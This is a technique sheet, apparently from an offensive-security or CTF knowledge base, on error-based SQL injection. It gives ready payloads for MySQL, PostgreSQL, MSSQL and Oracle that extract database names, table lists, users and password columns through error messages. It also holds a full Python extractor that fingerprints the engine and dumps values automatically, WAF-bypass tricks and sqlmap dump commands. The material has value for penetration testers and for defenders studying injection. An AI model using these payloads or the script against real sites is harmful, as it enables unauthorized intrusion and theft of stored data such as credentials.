---
title: "SQL Injection - Error-Based Extraction"
category: web
subcategory: sqli
type: technique
tags: [sqli, sql-injection, error-based, extractvalue, updatexml, xpath, double-query, cast, convert, xmltype, mysql, postgres, mssql, oracle, sqlmap, burp, substring]
difficulty: medium
summary: "Force the database to put your subquery result inside its own error message, and read the data out of the exception text."
when_to_use:
  - "The page prints a raw DBMS error (`XPATH syntax error: ...`, `invalid input syntax for integer`, `Conversion failed when converting`)"
  - "There is no UNION context (the query is an UPDATE/INSERT/DELETE, or the result set is not rendered)"
  - "Boolean blind works but is too slow and you want ~1 request per value instead of ~8 per character"
  - "`display_errors` is on, or a debug/stack-trace page leaks the SQL exception"
tools: [sqlmap, burp, curl]
---

## TL;DR

Some DBMS functions embed their argument in the exception string. Feed them a subquery, and the engine
prints your data as part of "invalid value X". One request gives you a whole value instead of one bit.
Every engine has at least one such function; the trick is knowing which, and how to chunk around its length cap.

## Recognise it

- A verbose SQL error is reflected in the HTML, a JSON `error` field, or an HTTP 500 body.
- `?id=1'` -> `XPATH syntax error: ''` or `You have an error in your SQL syntax near '''`  => MySQL.
- `?id=1'` -> `invalid input syntax for type integer: "1'"` or `unterminated quoted string` => PostgreSQL.
- `?id=1'` -> `Conversion failed when converting the varchar value ... to data type int` => MSSQL.
- `?id=1'` -> `ORA-01756: quoted string not properly terminated` => Oracle.
- The injection sits in an `INSERT`/`UPDATE` where there is no result set to UNION into, but errors still surface.

## Theory

Error-based extraction needs a function with two properties: it takes an expression argument (so you can
put a subquery there), and it **echoes that argument verbatim in its error message**.

### MySQL

Three classic primitives:

1. **`extractvalue(1, CONCAT('~', (SELECT ...)))`** -- XPath parser. `~` is not a legal XPath start, so libxml
   raises `XPATH syntax error: '~<your data>'`. **Caps at 32 characters** of echoed text.
2. **`updatexml(1, CONCAT('~', (SELECT ...)), 1)`** -- identical mechanism, same 32-char cap, same error class.
3. **Double-query / `floor(rand()*2)` duplicate-key**: `GROUP BY` over `concat((SELECT ...), floor(rand(0)*2))`
   makes the temporary key collide, and MySQL reports `Duplicate entry '<data>1' for key 'group_key'`.
   This one is **not capped at 32** and works on old 5.0 installs where `extractvalue` does not exist (5.1+).

```sql
-- 1. extractvalue, 32 chars max
' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -

-- 2. updatexml
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -

-- 3. double-query / duplicate entry (no 32-char cap)
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT concat(user,0x3a,password) FROM users LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- 4. exp() overflow (MySQL 5.5.5 - 5.5.48)
' AND exp(~(SELECT * FROM (SELECT user())a))-- -

-- 5. name_const duplicate (5.0.12+)
' AND (SELECT * FROM (SELECT name_const((SELECT version()),1),name_const((SELECT version()),1))a)-- -

-- 6. JSON functions (MySQL 5.7+)
' AND json_keys((SELECT convert((SELECT database()) using utf8)))-- -
```

The 32-char cap on `extractvalue`/`updatexml` is why you chunk:
`SUBSTRING((SELECT ...), 1, 31)`, then `32, 31`, then `63, 31`, ...

### PostgreSQL

Postgres does not have an XPath echo, but it has strict casting: casting text to `int` prints the offending text.

```sql
-- cast a subquery result to int; the error contains the text
' AND 1=CAST((SELECT current_database()) AS int)-- -
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS int)-- -
-- ::int shorthand
' AND 1=(SELECT version())::int-- -
-- division by zero carrying data is NOT a thing; use cast. For no-quote contexts:
' AND CAST(chr(126)||(SELECT usename FROM pg_user LIMIT 1)||chr(126) AS numeric)>0-- -
-- XML path variant on 10+
' AND 1=CAST((SELECT query_to_xml('SELECT usename FROM pg_user',true,true,'')::text) AS int)-- -
```

Error text looks like: `invalid input syntax for type integer: "ctf_db"` -- everything between the quotes is yours.
Postgres does **not** truncate, so a `string_agg` of a whole table comes back in one shot (until the error
message hits the server's own limit, typically generous).

### Microsoft SQL Server

Same idea, via implicit conversion.

```sql
-- conversion error prints the varchar being converted
' AND 1=CONVERT(int,(SELECT @@version))-- -
' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -
' AND 1=CAST((SELECT TOP 1 name FROM sys.tables) AS int)-- -
-- concat all table names into one error
' AND 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))-- -
-- pre-2017
' AND 1=CONVERT(int,(SELECT name+',' FROM sys.tables FOR XML PATH('')))-- -
-- ORDER BY position (no AND available): the sort expression still evaluates
1; SELECT 1/0-- -
ORDER BY CONVERT(int,(SELECT @@version))
```

Error text: `Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2019 ...' to data type int.`

### Oracle

```sql
-- CTXSYS.DRITHSX.SN prints its second argument
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -
-- XMLType constructor: ORA-19202 carries the payload
' AND 1=(SELECT XMLType(chr(60)||chr(58)||(SELECT user FROM dual)||chr(62)) FROM dual)-- -
-- utl_inaddr (blocked on 11g+ by default ACLs but try it)
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))-- -
-- ordinary conversion error
' AND 1=to_number((SELECT user FROM dual))-- -
-- dbms_xdb_version (11g)
' AND 1=(SELECT dbms_xdb_version.checkin((SELECT user FROM dual)) FROM dual)-- -
```

### SQLite

SQLite has no useful error-echo primitive. Errors are generic (`unrecognized token`, `no such column`).
Use boolean or time-based there, or use `load_extension` for something better. See `sqli-sqlite`.

## Attack

1. Confirm the error is reflected and identify the engine from the error wording.
2. Pick the primitive for that engine.
3. Test with a 1-value probe: `database()` / `current_database()` / `DB_NAME()` / `user FROM dual`.
4. Write a regex that pulls the payload out of the error text (the delimiters you injected, e.g. `~...~`).
5. Dump schema with the aggregate concat, chunking with `SUBSTRING` if the engine truncates.
6. Dump rows, either with the aggregate or `LIMIT 1 OFFSET n` per row.

## Code

```python
#!/usr/bin/env python3
"""Error-based SQLi extractor for MySQL / PostgreSQL / MSSQL / Oracle.

Usage:
    python3 errsqli.py "http://127.0.0.1:8000/item.php?id=1" mysql "SELECT database()"
    python3 errsqli.py "http://127.0.0.1:8000/item.php?id=1" mysql \
        "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"

Chunking is automatic for engines that truncate the error text (MySQL: 32 chars).
"""
from __future__ import annotations

import re
import sys
import urllib.parse

import requests

TIMEOUT = 12
DELIM = "0x7e"          # '~' as a hex literal: no quotes needed in the payload
DELIM_CHR = "~"

# Per-engine: payload template (takes a raw SQL expression), max echoed chars, error regex.
ENGINES = {
    "mysql": {
        "tpl": "' AND extractvalue(1,concat({d},({expr}),{d}))-- -",
        "chunk": 30,
        "rx": r"XPATH syntax error: '~?(.*?)~?'",
        "sub": "SUBSTRING(({expr}),{off},{n})",
    },
    "mysql_dq": {   # double-query, no length cap
        "tpl": "' AND (SELECT 1 FROM (SELECT count(*),concat(({expr}),floor(rand(0)*2))x "
               "FROM information_schema.tables GROUP BY x)a)-- -",
        "chunk": 0,
        "rx": r"Duplicate entry '(.*?)1?' for key",
        "sub": "SUBSTRING(({expr}),{off},{n})",
    },
    "postgres": {
        "tpl": "' AND 1=CAST(({expr}) AS int)-- -",
        "chunk": 0,
        "rx": r'invalid input syntax for (?:type )?\w+: "(.*?)"',
        "sub": "substr(({expr}),{off},{n})",
    },
    "mssql": {
        "tpl": "' AND 1=CONVERT(int,({expr}))-- -",
        "chunk": 0,
        "rx": r"[Cc]onverting the (?:n?varchar|character string) value '(.*?)' to",
        "sub": "SUBSTRING(({expr}),{off},{n})",
    },
    "oracle": {
        "tpl": "' AND 1=CTXSYS.DRITHSX.SN(1,({expr}))-- -",
        "chunk": 0,
        "rx": r"DRG-11701: thesaurus (.*?) does not exist",
        "sub": "SUBSTR(({expr}),{off},{n})",
    },
}


def build(url: str, payload: str) -> str:
    parts = urllib.parse.urlsplit(url)
    qs = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    if not qs:
        raise SystemExit("[-] need a query parameter to inject into")
    k, v = qs[-1]
    qs[-1] = (k, v + payload)
    q = "&".join(f"{a}={urllib.parse.quote(b, safe='')}" for a, b in qs)
    return urllib.parse.urlunsplit((parts.scheme, parts.netloc, parts.path, q, parts.fragment))


def shoot(sess: requests.Session, url: str, engine: str, expr: str) -> str:
    cfg = ENGINES[engine]
    payload = cfg["tpl"].format(expr=expr, d=DELIM)
    try:
        body = sess.get(build(url, payload), timeout=TIMEOUT).text
    except requests.RequestException as exc:
        print(f"[-] request failed: {exc}", file=sys.stderr)
        return ""
    m = re.search(cfg["rx"], body)
    if not m:
        return ""
    return m.group(1).strip(DELIM_CHR)


def extract(sess: requests.Session, url: str, engine: str, expr: str) -> str:
    """Pull the full value, chunking if the engine truncates."""
    cfg = ENGINES[engine]
    if not cfg["chunk"]:
        return shoot(sess, url, engine, expr)
    out, off, n = "", 1, cfg["chunk"]
    while True:
        piece = shoot(sess, url, engine, cfg["sub"].format(expr=expr, off=off, n=n))
        if not piece:
            break
        out += piece
        if len(piece) < n:
            break
        off += n
        if off > 20000:
            break
    return out


def fingerprint(sess: requests.Session, url: str) -> str:
    probes = {
        "mysql": "SELECT @@version",
        "postgres": "SELECT version()",
        "mssql": "SELECT @@version",
        "oracle": "SELECT banner FROM v$version WHERE rownum=1",
    }
    for eng, q in probes.items():
        got = shoot(sess, url, eng, q)
        if got:
            print(f"[+] {eng}: {got[:60]}")
            return eng
    return ""


def main() -> None:
    url = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000/item.php?id=1"
    engine = sys.argv[2] if len(sys.argv) > 2 else ""
    expr = sys.argv[3] if len(sys.argv) > 3 else "SELECT @@version"
    sess = requests.Session()

    if not engine:
        engine = fingerprint(sess, url)
        if not engine:
            print("[-] no error echo detected; try boolean/time blind")
            return
    if engine not in ENGINES:
        raise SystemExit(f"[-] engine must be one of {list(ENGINES)}")

    print(f"[*] engine={engine} expr={expr}")
    value = extract(sess, url, engine, expr)
    print(f"[+] {value!r}" if value else "[-] nothing extracted (check the error regex against a raw response)")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **The 32-char cap bites silently.** `extractvalue` returns a truncated string with no warning.
  If a value looks suspiciously exactly 31/32 chars, chunk it.
- **`rand(0)` matters** in the double-query trick. `rand()` without the seed is non-deterministic and the
  duplicate-key collision may not fire; `rand(0)` makes the sequence fixed. If it still fails, add more
  rows to the FROM (`information_schema.columns` instead of `.tables`) so `GROUP BY` sees >= 3 rows.
- **MySQL 8 removed nothing but changed messages.** `extractvalue`/`updatexml` still work; the error
  string is the same shape. `exp(~(...))` overflow was fixed after 5.5.48.
- **Postgres `CAST(... AS int)` inside a string context** needs the quote closed first; in a numeric context
  drop the leading `'`.
- **MSSQL stacked queries** are usually available (`;`), which gives you `RAISERROR` and `xp_cmdshell`.
  If `;` works, prefer stacked queries to error-based.
- **The error is caught and replaced with a generic 500.** Then the *presence* of the 500 is still a boolean
  oracle -- degrade gracefully to `sqli-blind-boolean`.
- **WAF strips `information_schema`.** Use `/*!50000information_schema*/`, `information_schema` with
  inline comments, or the engine's alternates (`sys.tables`, `pg_class`, `mysql.innodb_table_stats`).
- **Do not confuse "error appears" with "data appears".** A syntax error proves injection; you need the
  *specific* echo function for extraction.

## Tools

- `sqlmap -u URL --technique=E --dbms=mysql --dump` -- error-based only, much faster than blind.
- `sqlmap -r req.txt --level=5 --risk=3 --string='...'` when you must pin a match string.
- Burp Repeater + the Logger view to see the raw error before writing a regex.

## References

- PortSwigger Web Security Academy -- SQL injection: https://portswigger.net/web-security/sql-injection
- PayloadsAllTheThings -- SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings
- sqlmap payload definitions (`data/xml/payloads/error_based.xml`): https://github.com/sqlmapproject/sqlmap
